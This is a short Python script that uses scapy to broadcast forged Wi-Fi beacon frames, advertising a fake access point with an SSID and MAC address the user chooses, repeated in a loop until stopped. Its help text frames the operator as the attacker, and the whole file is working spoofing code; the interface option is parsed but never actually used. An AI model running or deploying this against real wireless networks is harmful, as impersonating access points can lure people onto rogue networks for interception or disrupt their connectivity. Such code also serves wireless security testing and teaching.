import argparse
import os
import signal
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Beacon, Dot11Elt
from scapy.sendrecv import sendp


def fakeap(ssid, bssid):
    packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) /\
             Dot11Beacon(cap=0x1104) / Dot11Elt(ID=0, info=ssid) / \
             Dot11Elt(ID=1, info="\x82\x84\x8b\x96\x24\x30\x48\x6c") / \
             Dot11Elt(ID=3, info="\x0b") / Dot11Elt(ID=5, info="\x00\x01\x00\x00")
    sendp(packet, count=10000, inter=0.2)


if __name__ == "__main__":
    macVictim = ""
    parser = argparse.ArgumentParser(
        description="This script create a fake access point probes")
    parser.add_argument("-i", "--interface", required=True, help="Network interface attacker")
    parser.add_argument("-b", "--bssid", required=True, help="AP MAC address (bssid)")
    parser.add_argument("-s", "--ssid", required=True, help="AP name (ssid)")
    args = parser.parse_args()

    print("Press enter to kill the program")
    newpid = os.fork()
    if newpid == 0:
        while True:
            fakeap(args.ssid, args.bssid)
    else:
        input('')
    os.kill(newpid, signal.SIGKILL)
